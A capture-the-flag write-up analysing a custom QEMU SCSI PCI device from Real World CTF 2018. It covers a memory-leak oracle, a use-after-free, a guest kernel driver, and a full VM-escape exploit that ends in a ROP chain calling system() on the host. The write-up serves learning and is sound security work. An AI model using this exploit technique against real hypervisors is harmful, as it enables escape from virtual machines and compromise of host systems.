---
title: Real World CTF Quals 2018 - SCSI
authors: pernicious
date: 2018-08-01
categories: binary-exploitation
---

This challenge was from Real World CTF 2018. RPISEC was the only solve.  
I probably spent upwards of 20 hours on this challenge. Needless to say, this will be a somewhat lengthy writeup.

>To improve disk I/O performance, I wrote a SCSI device. Do you want to have a try?

## Initial Overview and Analysis

We are given a `qemu-system-x86_64` binary and a shell script to run it, along with the associated files (lines split up for readability):
```sh
#!/bin/sh
./qemu-system-x86_64 --enable-kvm -L ./dependences -initrd ./rootfs.cpio \
    -kernel ./vmlinuz-4.13.0-38-generic \
    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
    -m 56M --nographic -device ctf-scsi,id=bus0 \
    -drive file=test.img,if=none,id=d0 -device scsi-disk,drive=d0,bus=bus0.0
```

We see it's adding a device `ctf-scsi`. Normal qemu certainly doesn't have this device, meaning it's probably a part of the qemu binary itself.
Sure enough:
```
pernicious@debian:~/Desktop/CTF/realworld18/scsi$ strings ./qemu-system-x86_64 | grep ctf
ctf-scsi
hw/scsi/ctf.c
ctf_class_init
ctf.c
ctf_dma_write
hw/scsi/ctf.c
ctf_process_reply
ctf_mmio_read
...
```

In fact, the binary wasn't stripped, making reversing and debugging a lot less painful.  

We start at `ctf_class_init`. This sets up things like the `device_id` and `vendor_id` of the device, and specifies a function that 'realizes' the device.  

`ctf_realize` (which we assume gets called at some point) then interprets the `PCIDevice` structure as a `CTFState` structure, initializing some internal state variables.  

For future reference, the structs of interest are (assume typedefs are properly inserted):
```c
struct CTFState {
    PCIDevice pdev;
    MemoryRegion mmio;
    SCSIBus bus;
    uint64_t high_addr;
    int state;
    int register_a;
    int register_b;
    int register_c;
    int pwidx;
    char pw[4];
    SCSIRequest* cur_req;
    int (*dma_read)(void*, char*, int);
    int (*dma_write)(void*, char*, int);
    CTF_req req;
    char* dma_buf;
    int dma_buf_len;
    int dma_need;
};
struct CTF_req {
    CTF_req_head head;
    char* cmd_buf;
};
struct CTF_req_head {
    uint8_t target_id;
    uint8_t target_bus;
    uint8_t lun;
    uint8_t pad;
    unsigned int buf_len;
    int type;
};
```

After initializing this struct, there are a few interesting lines. The first specifies the interrupt pin for the device, which turns out to be unimportant.  

Next is
```c
memory_region_init_io(&state->mmio, &state->pdev.qdev.parent_obj, &ctf_mmio_ops, state, "ctf-scsi", 0x1000);
```
Some googling leads to [qemu documentation](https://github.com/qemu/qemu/blob/master/docs/devel/memory.txt):
```
There are multiple types of memory regions (all represented by a single C type
MemoryRegion):
...
- MMIO: a range of guest memory that is implemented by host callbacks;
  each read or write causes a callback to be called on the host.
  You initialize these with memory_region_init_io(), passing it a
  MemoryRegionOps structure describing the callbacks.
```
`ctf_mmio_ops` contains two function pointers: `ctf_mmio_read` and `ctf_mmio_write`, meaning these functions will be called on every read/write to the devices memory.  

The next line is
```c
pci_register_bar(&state->pdev, 0, 0, &state->mmio);
```
Some more googling teaches us about bars. These bars however do not distribute psychoactive substances, they are [Base Address Registers](https://stackoverflow.com/questions/30190050/what-is-the-base-address-register-bar-in-pcie#44716618). Basically a physical memory address the device uses to communicate with the kernel, in this case through memory mapped io operations.

The last line is
```c
scsi_bus_new(&state->bus, 0x78, &state->pdev.qdev, &ctf_scsi_info, 0);
```
We assume this somehow registers the scsi bus/device with qemu, with `ctf_scsi_info` specifying some callbacks for processing requests on the bus/device: `ctf_transfer_data`, `ctf_request_complete`, and `ctf_request_cancelled`.  

Based on what we've seen, it's probably safe to say `ctf_mmio_read` and `ctf_mmio_write` are the main entry points for communicating with the device.  

`ctf_mmio_read` is unexciting. It takes in a `CTFState` structure, an address to read from, and the size of the read (which is ignored).
It handles reads from `0` to `0x1c` at 4 byte increments, and simply returns various internal state variables.  

`ctf_mmio_write` is a lot more complex. It translates to something like this:
```c
void ctf_mmio_write(CTFState* state, uint64_t addr, uint64_t val, unsigned int size) {
    switch (addr) {
        case 0x0:
            ctf_set_io(state, val);
            break;
        case 0x4:
            if (state->pw[state->pwidx] == (uint8_t)val) {
                if (++state->pwidx == 4)
                    state |= ST_AUTHED;
            }
            else
                state->pwidx = 0;
            break;
        case 0x8:
            ctf_process_req(state, (uint32_t)val);
            break;
        case 0xc:
            ctf_reset(state);
            break;
        case 0x10:
            state->register_a = val;
            break;
        case 0x14:
            state->register_b = val;
            break;
        case 0x18:
            ctf_process_reply(state);
            break;
        case 0x1c:
            ctf_add_cmd_data(state, val);
            break;
    }
}
```
Right off the bat we notice `state->pwidx` is not bounds checked. This gets us an oracle: if we write an additional byte to the password, then check `state->pwidx` (which we can read from `ctf_mmio_read`), if it was reset to `0` the byte was wrong, otherwise it was correct. We can use this to implement a byte by byte brute force that will leak the bytes immediately following `state->pw`.  
The fields immediately following are `cur_req` and `dma_read`, the latter being a function pointer within the qemu binary, giving us a text leak. Leaking `cur_req` will be a heap allocated `SCSIRequest` which will come into play later.  

Back to looking at the functionality. Once we are authenticated, we can call `ctf_set_io` which requires the user be authenticated and sets a state variable needed to process requests.
Now we can send scsi requests with `ctf_process_req`. This function is something like:
```c
void ctf_process_req(CTFState* state, uint64_t val) {
    if (state->state & ST_SETIO) { // set in ctf_set_io if authed
        addr = val | (state->high_addr<<32); // supplied during ctf_set_io
        if (state->cur_req)
            scsi_req_cancel(state->cur_req);
        CTF_req_head tmp;
        cpu_physical_memory_read(addr, &tmp, sizeof(tmp)); // reads from guests physical memory space
        SCSIDevice* sdev = scsi_find_device(&state->bus, tmp.target_bus, tmp.target_id, tmp.lun);
        if (sdev) {
            state->state |= ST_REQ_ADDED;
            memcpy(&state->req_head, tmp, sizeof(tmp));
            state->req.cmd_buf = malloc(tmp.buf_len);
            cpu_physical_memory_read(addr+sizeof(tmp), state->req.cmd_buf, tmp.buf_len);
            state->cur_req = scsi_req_new(sdev, 0, tmp.lun, state->req.cmd_buf, state);
            if (state->cur_req && scsi_req_enqueue(state->cur_req))
                scsi_req_continue(state->cur_req);
        }
    }
}
```
If there was a pending request, it gets canceled. It then reads into `tmp` some info about the request. The `target_bus`, `target_id`, and `lun` (logical unit number)
are used to find a matching device. If one exists, it allocates memory for the request and reads it in. It then creates the request and enqueues it.  

We don't really know what these internal qemu functions do, so instead let's take a look at the other callbacks defined for the device.  

`ctf_request_completed` and `ctf_request_cancelled` are identical except for one line:
```c
void ctf_request_complete(SCSIRequest* req) {
    CTFState* state = (CTFState*)req->hba_private;
    state->state ^= ST_REQ_ADDED;
    free(state->req.cmd_buf);
    state->req.cmd_buf = 0;
    scsi_req_unref(req); // recount for req, will free when reaches 0
    state->cur_req = 0; // ctf_request_cancelled doesnt have this line...
}
```
Hmmm.... we smell a UAF.  

Let's look back at the logic in `ctf_process_req`. If there is a pending request, it calls `scsi_req_cancel(state->cur_req)` (this is the only xref to `scsi_req_cancel` within the ctf-scsi device).
Let's assume this triggers the callback to `ctf_request_cancelled`, which decrements the refcount of the request and frees it. It reads in a new request, searches for a matching device, and re-assigns `state->cur_req = scsi_req_new(...)`. However, if a matching device is not found by `scsi_find_device`, `state->cur_req` isn't re-assigned, leaving a dangling pointer to the request we just freed.  

With a pretty good feeling we've found the bug, it's now a matter of interfacing with the device and working out the exact execution path.
A lot easier said than done...  

We still have no idea how to trigger the mmio functions by reading/writing stuff.
I figured we would need to write a kernel driver. Doing some research led to [this toy pci device for qemu](https://static.lwn.net/images/pdf/LDD3/ch12.pdf), and a [corresponding driver](https://github.com/cirosantilli/linux-kernel-module-cheat/blob/6788a577c394a2fc512d8f3df0806d84dc09f355/kernel_module/pci.c) someone had written.
I also read most of [LDD3 chapter 12](https://static.lwn.net/images/pdf/LDD3/ch12.pdf).  

#### Writing the Driver

Following along with LDD3 and the driver linked above, we first define the types of devices our driver will recognize
```c
#define QEMU_VENDOR_ID 0x1234
#define CTF_DEVICE_ID 0x11e9
static struct pci_device_id pci_ids[] = {
    {PCI_DEVICE(QEMU_VENDOR_ID, CTF_DEVICE_ID)},
    {0,}
};
MODULE_DEVICE_TABLE(pci, pci_ids);
```
and attach this to the driver struct
```c
static struct pci_driver pci_driver = {
    .name = "ctf_scsi_driver",
    .id_table = pci_ids, // device ids we just defined
    .probe = pci_probe, // called when the kernel finds a matching device
    .remove = pci_remove // called when driver unloaded or device removed
};
```
We now define the probe and remove functions
```c
static void __iomem* mmio;

int pci_probe(struct pci_dev* dev, const struct pci_device_id* id) {
    int ret;

    printk(KERN_INFO "[+] pci_probe called\n");
    ret = pci_enable_device(dev); // enable further operations on the device
    if (ret < 0) {
        printk(KERN_INFO "[x] failed to enable pci device\n");
        return ret;
    }
    printk(KERN_INFO "[+] pci device enabled\n");

    ret = pci_request_region(dev, 0, "ctfregion0"); // request BAR 0
    if (ret) {
        printk(KERN_INFO "[x] failed to request region\n");
        return ret;
    }

    mmio = pci_iomap(dev, 0, 0); // map BAR 0
    if (!mmio) {
        printk(KERN_INFO "[x] failed to map mmio\n");
        return -EFAULT;
    }
    printk(KERN_INFO "[+] mapped mmio %p\n", mmio);

    return 0;
};

void pci_remove(struct pci_dev* dev) {
    printk(KERN_INFO "[+] removing pci device\n");
    pci_release_region(dev, 0); // release BAR 0
};
```

Now when initializing our module, we can register the driver
```c
static int __init ctf_driver_init(void) {
    int ret;

    printk(KERN_INFO "[+] initializing ctf pci driver...\n");
    ret = pci_register_driver(&pci_driver); // register driver, device should be detected immediately
    if (ret) {
        printk(KERN_INFO "[x] failed to load ctf pci driver\n");
        return -ENOMEM;
    }
    printk(KERN_INFO "[+] loaded ctf pci driver\n");

    return 0;
}
```

After setting up a Makefile, manually downloading the specific headers for the ubuntu kernel version (for some reason insmod wouldnt work with my own headers...),
and making it easy to add our module to the cpio archive, we see that our driver loads correctly

```
[    1.339513] [+] initializing ctf pci driver...
[    1.343519] [+] pci_probe called
[    1.277851] ACPI: PCI Interrupt Link [LNKD] enabled at IRQ 11
[    1.373705] [+] pci device enabled
[    1.377741] [+] mapped mmio ffffa04480059000
[    1.380978] [+] loaded ctf pci driver
/ # ls -al /sys/bus/pci/drivers/
...
drwxr-xr-x    2 root     0                0 Aug  1 06:54 ctf_scsi_driver
...
/ # cat /proc/iomem 
...
03800000-febfffff : PCI Bus 0000:00
  fd000000-fdffffff : 0000:00:02.0
  feb80000-febbffff : 0000:00:03.0
  febc0000-febdffff : 0000:00:03.0
  febf0000-febf0fff : 0000:00:02.0
  febf1000-febf1fff : 0000:00:04.0
    febf1000-febf1fff : ctfregion0
...
```

## Warm SCSI feelings

Time to send our first scsi request. A [Wikipedia entry](https://en.wikipedia.org/wiki/SCSI_command) provides some starting points.
We don't really care what these do, as long as they accomplish our goal: leave a request enqueued but not yet completed (so we can cancel it).  

First step will be seeing what `target_bus`/`target_id`/`lun` combinations are valid and will be found in `scsi_find_device`. This function implements a linked list traversal, and stepping through in gdb we see there is only one device, with all three fields 0.  

Next we must generate a request or series of requests such that the last one does not complete (i.e. doesn't trigger `ctf_request_complete`).
When allocating a scsi request in `scsi_req_new(...)` the type of command is used to choose a certain `SCSIReqOps` structure. This structure contains callbacks used in other scsi related functions (the more function pointers the better right?). In an effort to not get confused, I simply picked an `INQUIRY (0x12)` request and dealt with those functions, which ended up being (taken from qemu source):
```c
static const SCSIReqOps scsi_disk_emulate_reqops = {
    .size         = sizeof(SCSIDiskReq),
    .free_req     = scsi_free_request,
    .send_command = scsi_disk_emulate_command,
    .read_data    = scsi_disk_emulate_read_data,
    .write_data   = scsi_disk_emulate_write_data,
    .get_buf      = scsi_get_buf,
};
```
It's very possible a different type of request could've reached the uaf scenario quicker, but I took this path during the ctf.  

Now we need to understand how all these qemu functions and callbacks interact:
* `scsi_req_new` simply allocates the structure, parses the command, and selects the appropriate ops
* `scsi_req_enqueue` is essentially `return req->ops->send_command()` which is in this case...
    * `scsi_disk_emulate_command` which calls...
        * `scsi_disk_emulate_inquiry` which returns nonzero (legal request) if we meet the [two checks here](https://github.com/qemu/qemu/blob/68f1b569dccdf1bf2935d4175fffe84dae6997fc/hw/scsi/scsi-disk.c#L809) (lines 809 and 814)
    * if `scsi_disk_emulate_inquiry` returned nonzero, also returns nonzero, which for the top-level `ctf_process_req` goes on to call...
* `scsi_req_continue` calls `req->ops->read_data()` which is...
    * `scsi_disk_emulate_read_data` calls `scsi_req_data()`...
        * `scsi_req_data` calls `req->bus->info->transfer_data()`...
            * `ctf_transfer_data` calls `ctf_dma_write()`
            * if `ctf_dma_write` returns nonzero, calls `scsi_req_continue`
                * wait what??? o.0
                * this time `scsi_disk_emulate_read_data` calls `scsi_req_complete` instead
                    * which calls `req->bus->info->complete()` which is `ctf_request_complete` (which unrefs and zeros out `state->cur_req`)

It will help to know what `ctf_dma_write` returns, since that determines if `scsi_req_continue` is called again and `ctf_request_complete` thereafter:
```c
int ctf_dma_write(CTFState* state, char* buf, int len) {
    if (state->dma_buf) {
        ...
        ret = 0;
    }
    else {
        state->dma_buf = malloc(len);
        if (state->dma_buf) {
            ...
            state->state |= ST_DATA_WRITTEN_TO_DMA;
            ret = 1;
        }
        else
            ret = 0;
    }
    return ret;
}
```
For the first request, this will take the branch that `malloc`s and returns 1, meaning `ctf_transfer_data` will call `scsi_req_continue` and `ctf_request_complete` (nulling out `cur_req`).  

However if we send a 2nd identical request, `ctf_dma_write` will return 0, meaning `ctf_request_complete` will not be called.
This means `state->cur_req` won't be zeroed out, and we'll be able to cancel it to free it (by sending a subsequent request with no matching device).

```c
struct req_head* req = kzalloc(sizeof(struct req_head)+6, GFP_KERNEL);
req->buf_len = 6; // INQUIRY has length 6
req->data[0] = 0x12; // INQUIRY request
req->data[1] = 0x40; // data[1] and data[2] make it so scsi_disk_emulate_inquiry
req->data[2] = 0;    // (called from scsi_disk_emulate_command) doesnt fail and return -1
req->data[3] = 0x17; // xfer is 16bit from data[3:4], will be 0x1734
req->data[4] = 0x34; // (determines how much data transferred/malloced)
req->data[5] = 0x51; // last byte is...?? doesnt seem used no idea dont care
auth();
send_req(req); // first request completes
send_req(req); // this one doesn't complete

req->target_bus = 17; // no matching device
send_req(req); // cancels previous but doesnt get enqueued, cur_req dangling to previous request
```

Now we need to reclaim the data. The chunk that was just freed was a `SCSIRequest`, specifically a `SCSIDiskReq` (same struct with some extra data at the end), which has a size of `0x1f8`.  
I chose to use the allocation made in `ctf_add_cmd_data` (irrelevant code excluded):
```c
void ctf_add_cmd_data(CTFState* state, uint64_t val) {
    uint64_t addr = state->register_a | state->register_b; // this actually involved shifting 32, but theyre ints, so did nothing...
    if (!(state->state & ST_DATA_WRITTEN_TO_DMA)) {
        if (!state->dma_buf) {
            state->dma_buf = malloc(val); // arbitrary size
            if (state->dma_buf)
                cpu_physical_memory_read(addr, state->dma_buf, val); // arbitrary data
        }
    }
}
```
The only problem is we've set the `ST_DATA_WRITTEN_TO_DMA` bit in `state->state` and `state->dma_buf` is nonzero.
We can fix this by processing the scsi command reply in `ctf_process_reply` (irrelevant code excluded):
```c
void ctf_process_reply(CTFState* state) { 
    uint64_t addr = state->register_a | state->register_b;
    if (state->state & ST_DATA_WRITTEN_TO_DMA && addr && state->dma_buf) {
        state->state ^= ST_DATA_WRITTEN_TO_DMA;
        free(state->dma_buf);
        state->dma_buf = 0;
    }
}
```

So first we process the first request's reply, then add command data to reclaim the freed `state->cur_req`
```c
// process reply to free dma buffer so we can add cmd data
reply = kmalloc(0x1734, GFP_KERNEL);
get_reply(reply);
kfree(reply);

pl = kmalloc(uaf_sz, GFP_KERNEL);
memset(pl, 0x41, uaf_sz);
add_cmd_data(pl, uaf_sz); // reclaim freed state->cur_req
```

Using a quick gdb script we can verify we've reclaimed the chunk:
```gdb
file ./qemu-system-x86_64
aslr on

#right after malloc() and cpu_physical_memory_read()
b *ctf_add_cmd_data+0xb2

r --enable-kvm -L ./dependences -initrd ./dbgrootfs.cpio.gz -kernel ./vmlinuz-4.13.0-38-generic -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -m 56M --nographic -device ctf-scsi,id=bus0 -d0

set $state = *(CTFState**)($rbp-0x10)
set $cur_req = $state->cur_req
tele $cur_req
```
```gdb
Thread 4 "qemu-system-x86" hit Breakpoint 1, ctf_add_cmd_data (opaque=0x560cc3610b40, val=0x1f8) at hw/scsi/ctf.c:230
230 hw/scsi/ctf.c: No such file or directory.
0000| 0x7fbbd0332b90 ('A' <repeats 200 times>...)
0008| 0x7fbbd0332b98 ('A' <repeats 200 times>...)
0016| 0x7fbbd0332ba0 ('A' <repeats 200 times>...)
0024| 0x7fbbd0332ba8 ('A' <repeats 200 times>...)
0032| 0x7fbbd0332bb0 ('A' <repeats 200 times>...)
0040| 0x7fbbd0332bb8 ('A' <repeats 200 times>...)
0048| 0x7fbbd0332bc0 ('A' <repeats 200 times>...)
0056| 0x7fbbd0332bc8 ('A' <repeats 200 times>...)
gdb-peda$ 
```

## pwn
At this point we have `state->cur_req` pointing at our controlled data, and we also can get leaks with the byte by byte brute force discussed earlier.
We can leak `cur_req` which tells us where our controlled data is, and a text leak for gadgets/functions.  

If we proceed to send another request via `ctf_process_req`, it will call `scsi_req_cancel()` on our now controlled data.
Let's see what this does. I've pointed out the path I targeted.
```c
void scsi_req_cancel(SCSIRequest* req) {
    trace_scsi_req_cancel(req->dev->id, ...); // req->dev needs to be dereferencable
    if (req->enqueued == 1) {
        assert(req->io_canceled == 1);
        scsi_req_ref(req); // asserts refcount != 0
        scsi_req_dequeue(req); // need to make sure some linked list pointers are writeable
        if (req->aiocb)
            ...
        else
            scsi_req_cancel_complete(req); // target this
    }
}
void scsi_req_cancel_complete(SCSIRequest* req) {
    if (req->bus->info->cancel)
        req->bus->info->cancel(req); // ehh didnt work out easily
    notifier_list_notify(&req->cancel_notifiers, req); // target this instead
}
void notifier_list_notify(NotifierList* list, void* data) {
    // basically a linked list of function pointers
    // struct Notifier {
    //   void (*notify)(void*, void*);
    //   struct Notifier* next;
    // }
    for (Notifier* cur = list->notifiers.lh_first; cur; ) {
        Notifier* next = cur->next;
        cur->notify(cur, data); // boom
    }
}
```
`system` was in the `plt`, however the arguments to all these function calls are structures whose first fields are pointers, meaning we won't be able to put our command string there.  
Instead I targeted the function pointer call in `notifier_list_notify`. The stack layout after this call will be:
```
 0x0: return address from function pointer call
 0x8: -
0x10: -
0x18: cur
0x20: next
```
We make `cur->notify` point to this gadget: `add rsp, 0x10 ; pop rbx ; pop rbp ; ret`  
This pops `cur` into `rbp`, then rets to whatever `next` is.  

We make `next` point to this gadget: `leave ; pop rsi ; dec ecx ; ret`  
This will set `rsp` to `cur` then pop off 2 things (1 for `leave`, 1 for `pop rsi`), which pops off the two struct entries of `cur`, and we can place a ropchain afterwards.  

Then we do a short ropchain to set `rdi` to our command and ret to `system.plt`  

It seems qemu screws with the terminal i/o (`/bin/sh` is unresponsive) so we `cat flag` instead
```
[    1.249520] [+] initializing ctf pci driver...
[    1.254937] [+] pci_probe called
[    1.277851] ACPI: PCI Interrupt Link [LNKD] enabled at IRQ 11
[    1.282401] [+] pci device enabled
[    1.284807] [+] mapped mmio ffffb90940059000
[    1.289681] [+] loaded ctf pci driver
[    1.293190] [+] starting exploit...
[    1.789221] [+] TEXT: 0x556ab27e9000
[    1.792778] [+] cur_req: 0x7f45e4233bf0
rwctf{OMG_E5c4pe_fffrom_tHe_wh0le_wOrld}
Segmentation fault
```
The exploit isn't 100% reliable, I believe it wouldn't always reclaim the freed chunk, but it works often enough.  

As we've seen, sometimes bugs aren't super crazy to understand or exploit, it's just wrapping your head around the functionality required to trigger them (and if they're even triggerable) that takes a while.

### Full exploit
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

struct req_head {
    u8 target_id;
    u8 target_bus;
    u8 lun;
    u8 pad;
    u32 buf_len;
    s32 type;
    u8 data[0];
};
struct SCSIRequest
{
    u64 bus;
    void* dev;
    void* ops;
    u32 refcount;
    u32 tag;
    u32 lun;
    u32 status;
    void* hba_private;
    size_t resid;
    u8 cmd[0x30];
    void* cancel_notifiers;
    u8 sense[252];
    u32 sense_len;
    u8 enqueued;
    u8 io_canceled;
    u8 retry;
    u8 dma_started;
    void* aiocb;
    void* sg;
    void* tqe_next;
    void* tqe_prev;
    void* info;
    u64 cancel;
    u64 notify;
    u64 next;
    u64 rop[3];
    char shell_cmd[0x28]; // padded to same size as sizeof(SCSIDiskReq)
};


static void __iomem* mmio;

u32 read4(u64 off) {
    return ioread32(mmio+off);
}
void write4(u64 off, u32 val) {
    iowrite32(val, mmio+off);
}
void setaddr(void* addr) {
    u64 phys = virt_to_phys(addr);
    if (phys >= 0x100000000)
        printk(KERN_INFO "[!!!] %p (0x%llx) physical address not 32bit\n", addr, phys);
    write4(0x14, phys);
}

void auth(void) {
    write4(4, 'B');
    write4(4, 'L');
    write4(4, 'U');
    write4(4, 'E');
}

void send_req(struct req_head* req) {
    u64 phys = virt_to_phys(req);
    write4(0, phys>>32);
    write4(8, phys&0xffffffff);
}

void get_reply(void* dst) {
    setaddr(dst);
    write4(0x18, 0);
}

void add_cmd_data(void* data, u64 len) {
    setaddr(data);
    write4(0x1c, len);
}

// assumed called with pwidx == 4
void leakbytes(u64 nbytes, void* dst) {
    u8* out = dst;
    u64 byte;
    for (byte = 0; byte < nbytes; byte++) {
        u64 c;
        for (c = 0; c < 0x100; c++) {
            if (c) {
                u64 i;
                auth();
                for (i = 0; i < byte; i++)
                    write4(4, out[i]);
            }
            write4(4, c);
            if (read4(0x14))
                break;
        }
        if (c == 0x100) {
            memset(out, 0xff, nbytes);
            return;
        }
        out[byte] = c;
    }
}
void getleaks(struct SCSIRequest** cur_req, u64* text) {
    u64 leaks[2];
    leakbytes(sizeof(leaks), leaks);
    *cur_req = (struct SCSIRequest*)leaks[0];
    *text = leaks[1]-0x50915d;
}

void exploit(void) {
    u64 text;
    u8* reply;
    struct req_head* req;
    struct SCSIRequest* pl, *cur_req;
    u64 uaf_sz = 0x1f8; // sizeof(SCSIDiskReq) just freed

    printk(KERN_INFO "[+] starting exploit...\n");

    req = kzalloc(sizeof(struct req_head)+6, GFP_KERNEL);
    req->buf_len = 6; // INQUIRY has length 6
    req->data[0] = 0x12; // INQUIRY request
    req->data[1] = 0x40; // data[1] and data[2] make it so scsi_disk_emulate_inquiry
    req->data[2] = 0;    // (called from scsi_disk_emulate_command) doesnt fail and return -1
    req->data[3] = 0x17; // xfer is 16bit from data[3:4], make this 0x1734
    req->data[4] = 0x34; // (determines how much data transferred/malloced)
    req->data[5] = 0x51; // last byte is...?? doesnt seem used no idea dont care
    auth();
    send_req(req); // first request completes
    send_req(req); // this one doesn't complete

    req->target_bus = 17; // no matching device
    send_req(req); // cancels previous but doesnt get enqueued, cur_req dangling to previous request

    // process reply to free dma buffer so we can add cmd data
    reply = kmalloc(0x1734, GFP_KERNEL);
    get_reply(reply);
    kfree(reply);

    getleaks(&cur_req, &text); // so we know where vtables and stuff are
    printk(KERN_INFO "[+] TEXT: 0x%llx\n", text);
    printk(KERN_INFO "[+] cur_req: 0x%llx\n", (u64)cur_req);

    pl = kzalloc(uaf_sz, GFP_KERNEL);
    pl->dev = cur_req;
    pl->enqueued = 1;
    pl->io_canceled = 0;
    pl->refcount = 51;
    pl->tqe_next = cur_req;
    pl->tqe_prev = &cur_req->tqe_next;
    pl->aiocb = 0;
    pl->bus = (u64)&cur_req->info-0x70; // so bus->info is info
    pl->info = &cur_req->cancel-0x28; // so bus->info->cancel is cancel
    pl->cancel = 0;
    pl->cancel_notifiers = &cur_req->notify; // pointer to first entry in list
    pl->notify = text+0x2ae9fd; // add rsp, 0x10 ; pop rbx ; pop rbp ; ret
    pl->next = text+0x2df11b; // leave ; pop rsi ; dec ecx ; ret
    pl->rop[0] = text+0x3909c9; // pop rdi ; ret
    pl->rop[1] = (u64)&cur_req->shell_cmd;
    pl->rop[2] = text+0x204948; // system.plt
    strcpy(pl->shell_cmd, "cat flag");
    add_cmd_data(pl, uaf_sz); // reclaim freed state->cur_req

    send_req(req); // trigger scsi_req_cancel on reclaimed uaf request
    printk(KERN_INFO "[!!!] shouldve pwned\n");
}

int pci_probe(struct pci_dev* dev, const struct pci_device_id* id) {
    int ret;

    printk(KERN_INFO "[+] pci_probe called\n");
    ret = pci_enable_device(dev);
    if (ret < 0) {
        printk(KERN_INFO "[x] failed to enable pci device\n");
        return ret;
    }
    printk(KERN_INFO "[+] pci device enabled\n");

    ret = pci_request_region(dev, 0, "ctfregion0");
    if (ret) {
        printk(KERN_INFO "[x] failed to request region\n");
        return ret;
    }

    mmio = pci_iomap(dev, 0, 0);
    if (!mmio) {
        printk(KERN_INFO "[x] failed to map mmio\n");
        return -EFAULT;
    }
    printk(KERN_INFO "[+] mapped mmio %p\n", mmio);

    return 0;
};

void pci_remove(struct pci_dev* dev) {
    printk(KERN_INFO "[+] removing pci device\n");
    pci_release_region(dev, 0);
};

#define QEMU_VENDOR_ID 0x1234
#define CTF_DEVICE_ID 0x11e9
static struct pci_device_id pci_ids[] = {
    {PCI_DEVICE(QEMU_VENDOR_ID, CTF_DEVICE_ID)},
    {0,}
};
MODULE_DEVICE_TABLE(pci, pci_ids);

static struct pci_driver pci_driver = {
    .name = "ctf_scsi_driver",
    .id_table = pci_ids,
    .probe = pci_probe,
    .remove = pci_remove
};

static int __init ctf_driver_init(void) {
    int ret;

    printk(KERN_INFO "[+] initializing ctf pci driver...\n");
    ret = pci_register_driver(&pci_driver);
    if (ret) {
        printk(KERN_INFO "[x] failed to load ctf pci driver\n");
        return -ENOMEM;
    }
    printk(KERN_INFO "[+] loaded ctf pci driver\n");

    exploit();

    return 0;
}

static void __exit ctf_driver_exit(void) {
    pci_unregister_driver(&pci_driver);
    printk(KERN_INFO "[+] unloaded ctf pci driver\n");
}

module_init(ctf_driver_init);
module_exit(ctf_driver_exit);

MODULE_LICENSE("GPL");
```
